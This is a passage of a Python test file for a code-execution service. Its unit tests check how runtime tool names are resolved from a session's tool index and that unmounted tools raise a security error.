        result = svc._resolve_runtime_tool_name(session, "", "my_canonical_tool")
        assert result == "my_canonical_tool"

    def test_unqualified_unique_match(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        session.runtime_tool_index[("server1", "my_tool")] = "resolved_tool"
        result = svc._resolve_runtime_tool_name(session, "", "my_tool")
        assert result == "resolved_tool"

    def test_not_mounted_with_server(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        with pytest.raises(CodeExecutionSecurityError, match="not mounted"):
            svc._resolve_runtime_tool_name(session, "some_server", "missing_tool")

    def test_not_mounted_without_server(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        with pytest.raises(CodeExecutionSecurityError, match="not mounted"):
            svc._resolve_runtime_tool_name(session, "", "missing_tool")
